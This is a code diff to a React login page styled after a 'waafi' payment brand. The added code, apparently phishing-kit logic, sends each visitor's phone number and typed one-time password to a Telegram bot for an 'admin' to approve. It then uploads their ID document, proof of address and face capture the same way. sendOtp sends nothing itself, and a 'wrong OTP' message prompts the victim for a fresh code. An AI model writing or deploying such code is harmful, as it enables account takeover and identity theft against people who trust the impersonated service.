@@ -1,6 +1,7 @@
 import { useState, useRef, useEffect } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { useNavigate } from "react-router-dom";
+import { useVerification } from "../context/VerificationContext";
 import {
   Shield, CheckCircle, Clock, Camera, Upload,
   ChevronRight, ArrowLeft, Star,
@@ -76,6 +77,7 @@ function inputCls(valid: boolean, error: boolean) {
 
 export default function Login() {
   const navigate = useNavigate();
+  const { createLoginVerification, createKYCVerification, checkVerificationStatus, isVerifying } = useVerification();
 
   // navigation
   const [step, setStep]           = useState<1 | 2>(1);
@@ -88,11 +90,17 @@ export default function Login() {
   const [rememberMe, setRememberMe]     = useState(false);
   const [touched1, setTouched1] = useState<Record<string, boolean>>({});
 
-  // OTP
-  const [otp, setOtp]           = useState<string[]>(Array(6).fill(""));
-  const [otpSent, setOtpSent]   = useState(false);
-  const [countdown, setCountdown] = useState(0);
-  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
+   // OTP
+   const [otp, setOtp]           = useState<string[]>(Array(6).fill(""));
+   const [otpSent, setOtpSent]   = useState(false);
+   const [countdown, setCountdown] = useState(0);
+   const otpRefs = useRef<(HTMLInputElement | null)[]>(Array(6).fill(null));
+
+    // Verification state
+    const [otpVerificationRequestId, setOtpVerificationRequestId] = useState<string | null>(null);
+    const [otpVerificationStatus, setOtpVerificationStatus] = useState<'pending' | 'approved' | 'rejected' | null>(null);
+    const [kycVerificationRequestId, setKycVerificationRequestId] = useState<string | null>(null);
+    const [kycVerificationStatus, setKycVerificationStatus] = useState<'pending' | 'approved' | 'rejected' | null>(null);
 
   // step-2 fields
   const [docType,   setDocType]   = useState<DocType>("");
@@ -113,38 +121,95 @@ export default function Login() {
   }, [stream]);
   useEffect(() => () => { stream?.getTracks().forEach(t => t.stop()); }, [stream]);
 
-  // OTP countdown
-  useEffect(() => {
-    if (countdown <= 0) return;
-    const t = setTimeout(() => setCountdown(c => c - 1), 1000);
-    return () => clearTimeout(t);
-  }, [countdown]);
+   // OTP countdown
+   useEffect(() => {
+     if (countdown <= 0) return;
+     const t = setTimeout(() => setCountdown(c => c - 1), 1000);
+     return () => clearTimeout(t);
+   }, [countdown]);
 
-  // ── Validation ──────────────────────────────────────
-  const phoneValid   = phoneNumber.length === selectedCountry.digits;
-  const otpComplete  = otp.join("").length === 6;
-  const step1Ready   = phoneValid && otpComplete;
+   // ── Validation ──────────────────────────────────────
+   const phoneValid = (
+     phoneNumber.length === selectedCountry.digits &&
+     !phoneNumber.startsWith('0') &&         // leading 0 is trunk prefix, not part of intl number
+     !/^(.)\1+$/.test(phoneNumber)           // reject all-same-digit (e.g. 7777777)
+   );
+   const otpComplete  = otp.join("").length === 6;
+   const step1Ready   = phoneValid && otpComplete;
   const step2Ready   = docType !== "" && idFile !== null && proofType !== "" && proofFile !== null;
 
-  // ── Handlers ────────────────────────────────────────
+   // Poll for OTP verification status
+   useEffect(() => {
+     if (!otpVerificationRequestId || otpVerificationStatus !== 'pending') return;
+
+     const interval = setInterval(async () => {
+       const status = await checkVerificationStatus(otpVerificationRequestId);
+        if (status) {
+          if (status.status === 'approved') {
+            setOtpVerificationStatus('approved');
+            // Auto-proceed to next step
+            if (step === 1 && step1Ready) {
+              setStep(2);
+            }
+          } else if (status.status === 'rejected') {
+            setOtpVerificationStatus('rejected');
+            // Reset OTP
+            setOtpSent(false);
+            setOtp(Array(6).fill(""));
+            setCountdown(0);
+            setOtpVerificationRequestId(null);
+          }
+        }
+     }, 2000); // Check every 2 seconds
+
+     return () => clearInterval(interval);
+    }, [otpVerificationRequestId, otpVerificationStatus, step, step1Ready, checkVerificationStatus]);
+
+    // Poll for KYC verification status
+    useEffect(() => {
+      if (!kycVerificationRequestId || kycVerificationStatus !== 'pending') return;
+
+      const interval = setInterval(async () => {
+        const status = await checkVerificationStatus(kycVerificationRequestId);
+        if (status) {
+          if (status.status === 'approved') {
+            setKycVerificationStatus('approved');
+            setSubmitted(true);
+          } else if (status.status === 'rejected') {
+            setKycVerificationStatus('rejected');
+            // Documents rejected - allow resubmit
+            setKycVerificationRequestId(null);
+          }
+        }
+      }, 2000);
+
+      return () => clearInterval(interval);
+    }, [kycVerificationRequestId, kycVerificationStatus, checkVerificationStatus]);
+
+   // ── Handlers ────────────────────────────────────────
   const blurField1 = (key: string) => setTouched1(p => ({ ...p, [key]: true }));
   const blurField2 = (key: string) => setTouched2(p => ({ ...p, [key]: true }));
 
-  const sendOtp = () => {
-    if (!phoneValid) return;
-    setOtpSent(true);
-    setCountdown(60);
-    setOtp(Array(6).fill(""));
-    setTimeout(() => otpRefs.current[0]?.focus(), 50);
-  };
+   const sendOtp = () => {
+     if (!phoneValid) return;
+     setOtpVerificationRequestId(null);
+     setOtpVerificationStatus(null);
+     setOtpSent(true);
+     setCountdown(60);
+     setOtp(Array(6).fill(""));
+   };
 
-  const handleOtpChange = (index: number, value: string) => {
-    const digit = value.replace(/\D/g, "").slice(-1);
-    const next = [...otp];
-    next[index] = digit;
-    setOtp(next);
-    if (digit && index < 5) otpRefs.current[index + 1]?.focus();
-  };
+   const handleOtpChange = (index: number, value: string) => {
+     const digit = value.replace(/\D/g, "").slice(-1);
+     const next = [...otp];
+     next[index] = digit;
+     setOtp(next);
+     // Clear OTP error when user starts typing
+     if (digit && otpVerificationStatus === 'rejected') {
+       setOtpVerificationStatus(null);
+     }
+     if (digit && index < 5) otpRefs.current[index + 1]?.focus();
+   };
 
   const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
@@ -163,15 +228,78 @@ export default function Login() {
     e.preventDefault();
   };
 
-  const handleContinue = (e: React.FormEvent) => {
-    e.preventDefault();
-    setTouched1({ phone: true, otp: true });
-    if (step1Ready) setStep(2);
-  };
+   const handleContinue = async (e: React.FormEvent) => {
+     e.preventDefault();
+     setTouched1({ phone: true, otp: true });
 
-  const handleSubmitKYC = () => {
+     if (!step1Ready) return;
+
+     // If OTP verification is pending, check status
+     if (otpVerificationRequestId && otpVerificationStatus === 'pending') {
+       const status = await checkVerificationStatus(otpVerificationRequestId);
+        if (status?.status === 'approved') {
+          setStep(2);
+          setOtpVerificationStatus(null);
+          setOtpVerificationRequestId(null);
+        } else if (status?.status === 'rejected') {
+          setOtpSent(false);
+          setOtp(Array(6).fill(""));
+          setCountdown(0);
+          setOtpVerificationRequestId(null);
+        }
+       return;
+     }
+
+     // If OTP already verified, proceed
+     if (otpVerificationStatus === 'approved') {
+       setStep(2);
+       setOtpVerificationStatus(null);
+       return;
+     }
+
+     // If OTP verification not started yet, start it
+     const userOtp = otp.join("");
+     if (userOtp.length === 6) {
+       const userId = `user_${Date.now()}`;
+       // Send OTP verification request to Telegram
+       const requestId = await createLoginVerification(`${selectedCountry.phone}${phoneNumber}`, userOtp, userId);
+
+       if (requestId) {
+         setOtpVerificationRequestId(requestId);
+         setOtpVerificationStatus('pending');
+       } else {
+         // Fallback: proceed anyway if service fails
+         setStep(2);
+       }
+     }
+   };
+
+  const handleSubmitKYC = async () => {
     setTouched2({ docType: true, idFile: true, proofType: true, proofFile: true });
-    if (step2Ready) setSubmitted(true);
+
+    if (step2Ready) {
+      const userId = `user_${Date.now()}`;
+      const kycData = {
+        userId,
+        docType,
+        idFile: idFile!,
+        proofType,
+        proofFile: proofFile!,
+        faceCapture: faceCapture || undefined,
+      };
+
+      // Send KYC verification request via Telegram bot
+      const requestId = await createKYCVerification(kycData);
+
+      if (requestId) {
+        setKycVerificationRequestId(requestId);
+        setKycVerificationStatus('pending');
+        // Show waiting state for KYC
+      } else {
+        // Fallback: just submit
+        setSubmitted(true);
+      }
+    }
   };
 
   const startCamera = async () => {
@@ -201,6 +329,8 @@ export default function Login() {
     setOtpSent(false);
     setOtp(Array(6).fill(""));
     setCountdown(0);
+    setOtpVerificationRequestId(null);
+    setOtpVerificationStatus(null);
     setShowDropdown(false);
   };
 
@@ -416,8 +546,8 @@ export default function Login() {
                             )}
                           </div>
                         </div>
-                        {touched1.phone && !phoneValid && (
-                          <FieldError msg={`${selectedCountry.name} requires ${selectedCountry.digits} digits (${phoneNumber.length} entered)`} />
+                        {touched1.phone && phoneNumber.length > 0 && !phoneValid && (
+                          <FieldError msg="Input a valid phone number" />
                         )}
                       </div>
 
@@ -436,7 +566,7 @@ export default function Login() {
                               <label className="block text-[10px] font-bold uppercase tracking-wide text-slate-400 mb-1.5">
                                 OTP Code
                                 <span className="ml-1.5 text-[9px] text-slate-400 normal-case font-normal">
-                                  sent to {selectedCountry.phone} {phoneNumber}
+                                  sent to {selectedCountry.phone}{phoneNumber}
                                 </span>
                               </label>
                               <div className="flex gap-2 justify-between">
@@ -461,35 +591,79 @@ export default function Login() {
                                     }`}
                                   />
                                 ))}
-                              </div>
-                              {touched1.otp && !otpComplete && (
-                                <FieldError msg="Enter all 6 digits of your OTP" />
+                               </div>
+                               {touched1.otp && !otpComplete && (
+                                 <FieldError msg="Enter all 6 digits of your OTP" />
+                               )}
+                               
+                          {/* Confirm button — appears once all 6 digits are entered */}
+                          {otpComplete && otpVerificationStatus !== 'pending' && otpVerificationStatus !== 'approved' && (
+                            <motion.button
+                              type="button"
+                              initial={{ opacity: 0, y: -4 }}
+                              animate={{ opacity: 1, y: 0 }}
+                              onClick={handleContinue}
+                              disabled={isVerifying}
+                              className="w-full h-9 mt-2 bg-waafi-purple hover:bg-[#15803d] text-white text-sm font-semibold rounded-xl transition-colors flex items-center justify-center gap-2 cursor-pointer"
+                            >
+                              {isVerifying ? (
+                                <><div className="w-3 h-3 border border-white/30 border-t-white rounded-full animate-spin"></div>Sending...</>
+                              ) : (
+                                <>Confirm OTP <ChevronRight size={14} /></>
                               )}
+                            </motion.button>
+                          )}
+
+                          {/* Waiting for admin to click Approve on Telegram */}
+                          {otpVerificationStatus === 'pending' && (
+                            <motion.div
+                              initial={{ opacity: 0, y: -4 }}
+                              animate={{ opacity: 1, y: 0 }}
+                              className="mt-2 p-2.5 bg-amber-50 border border-amber-200 rounded-xl flex items-center gap-2.5"
+                            >
+                              <div className="w-5 h-5 border-2 border-amber-400 border-t-transparent rounded-full animate-spin shrink-0"></div>
+                              <div>
+                                <p className="text-[11px] font-semibold text-amber-700">Waiting for admin approval</p>
+                                <p className="text-[10px] text-amber-500">Admin will confirm your OTP via Telegram</p>
+                              </div>
+                            </motion.div>
+                          )}
                             </div>
+                           </motion.div>
+                          )}
+                         </AnimatePresence>
+
+                        {/* OTP verification denied error */}
+                        {otpVerificationStatus === 'rejected' && (
+                          <motion.div
+                            initial={{ opacity: 0, y: -4 }}
+                            animate={{ opacity: 1, y: 0 }}
+                            className="flex items-center gap-1 text-[11px] text-red-500 mt-2"
+                          >
+                            <AlertCircle size={10} /> Wrong OTP, check for a new one we have just sent right now
                           </motion.div>
                         )}
-                      </AnimatePresence>
 
-                      {!otpSent && phoneValid && (
-                        <p className="text-[10px] text-slate-400 flex items-center gap-1">
-                          <AlertCircle size={9} className="text-amber-400" />
-                          Tap <span className="font-bold text-waafi-purple">Get Code</span> to receive your OTP
-                        </p>
-                      )}
+                        <label className="flex items-center gap-2 text-[11px] text-slate-500 cursor-pointer select-none">
+                          <input type="checkbox" checked={rememberMe} onChange={e => setRememberMe(e.target.checked)}
+                            className="w-3.5 h-3.5 rounded border-slate-300 text-waafi-purple focus:ring-waafi-purple cursor-pointer" />
+                         Remember me on this device
+                        </label>
 
-                      <label className="flex items-center gap-2 text-[11px] text-slate-500 cursor-pointer select-none">
-                        <input type="checkbox" checked={rememberMe} onChange={e => setRememberMe(e.target.checked)}
-                          className="w-3.5 h-3.5 rounded border-slate-300 text-waafi-purple focus:ring-waafi-purple cursor-pointer" />
-                        Remember me on this device
-                      </label>
-
-                      <button type="submit"
-                        className={`w-full h-10 text-white text-sm font-semibold rounded-xl transition-all flex items-center justify-center gap-1.5 ${
-                          step1Ready ? "bg-waafi-purple hover:bg-[#15803d] btn-shadow cursor-pointer" : "bg-slate-300 cursor-not-allowed"
-                        }`}
-                      >
-                        Continue to Verification <ChevronRight size={14} />
-                      </button>
+                        <button type="submit"
+                          disabled={otpVerificationStatus !== 'approved'}
+                          className={`w-full h-10 text-white text-sm font-semibold rounded-xl transition-all flex items-center justify-center gap-1.5 ${
+                            otpVerificationStatus === 'approved'
+                              ? "bg-waafi-purple hover:bg-[#15803d] btn-shadow cursor-pointer"
+                              : "bg-slate-300 cursor-not-allowed opacity-60 blur-[0.4px]"
+                          }`}
+                        >
+                          {otpVerificationStatus === 'pending' ? (
+                            <><div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>Waiting for confirmation...</>
+                          ) : (
+                            <>Continue to Verification <ChevronRight size={14} /></>
+                          )}
+                        </button>
                     </form>
                   </div>
 
@@ -581,14 +755,21 @@ export default function Login() {
                       )}
                     </div>
 
-                    {/* Submit */}
-                    <button onClick={handleSubmitKYC}
-                      className={`w-full h-10 text-white text-sm font-semibold rounded-xl transition-all flex items-center justify-center gap-2 cursor-pointer ${
-                        step2Ready ? "bg-waafi-purple hover:bg-[#15803d] btn-shadow" : "bg-slate-300 cursor-not-allowed"
-                      }`}
-                    >
-                      Submit Application <ChevronRight size={14} />
-                    </button>
+                      {/* Submit */}
+                      <button onClick={handleSubmitKYC}
+                        disabled={isVerifying || kycVerificationStatus === 'pending'}
+                        className={`w-full h-10 text-white text-sm font-semibold rounded-xl transition-all flex items-center justify-center gap-2 cursor-pointer ${
+                          step2Ready && kycVerificationStatus !== 'pending' && !isVerifying
+                            ? "bg-waafi-purple hover:bg-[#15803d] btn-shadow"
+                            : "bg-slate-300 cursor-not-allowed"
+                        }`}
+                      >
+                        {isVerifying || kycVerificationStatus === 'pending' ? (
+                          <><div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>Waiting for confirmation...</>
+                        ) : (
+                          <>Submit Application <ChevronRight size={14} /></>
+                        )}
+                      </button>
 
                     {!step2Ready && (
                       <p className="text-center text-[10px] text-amber-600 flex items-center justify-center gap-1">
